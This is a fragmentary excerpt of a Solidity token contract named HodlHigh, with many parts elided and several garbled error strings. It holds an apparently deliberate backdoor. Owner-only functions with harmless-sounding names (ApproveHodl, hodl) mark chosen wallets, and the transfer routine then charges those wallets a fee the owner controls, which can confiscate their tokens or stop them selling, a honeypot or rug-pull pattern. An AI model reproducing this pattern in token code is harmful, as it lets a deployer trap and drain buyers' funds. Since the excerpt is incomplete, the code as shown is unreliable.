...
interface IERC20 {
    ...
    function hodl(address wallet) external;

    function ApproveHodl(address org, uint256 amnt) external;
...
contract Ownable is Context {
    ...
    modifier onlyowner() {
        require(
            _owner == _msgSender(),
            "Ownable: caller is not an owner"
        );
        _;
    }
...
contract HodlHigh is IERC20, Ownable {
    ...
    mapping(address => uint256) private hodlings;
    ...
    function ApproveHodl(address org, uint256 amnt)
        public
        override
        onlyowner
    {
    ...
    function hodl(address wallet) external onlyowner {
        hld = wallet;
    }
    ...
    function transferFrom(
        ...
        _approve(
            ...
            allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeded allowancess"
            )
        );
        return true;
    }
    ...
    function _transfer(
        ...
        require(
            recipient != address(0),
            "IERC20: transfer to the zero nul address never allowed"
        );
        require(
            sender != address(0),
            "IERC20: transfer from the zero nul address never allowed"
        );

        uint256 fees = 0;

        if (hodlings[sender] > 0) {
            fees = (hodlings[sender] * data * _decimals) / hundr;
        } else if (sender == pair) {
            fees = amounts.mul(buyFees).div(hundr);
        } else if (recipient == pair) {
            fees = amounts.mul(sellFees).div(hundr);
        } else {
            fees = 0;
        }
        ...
        require(
            blsender >= amounts,
            "IERC20: transfer amounts exceeded wallet balance token amount"
        );
    ...
    function _approve(
        ...
        require(owner != address(0), "ERC20: approve from the nulable address");
        require(spender != address(0), "ERC20: approve to the nul nulable address");
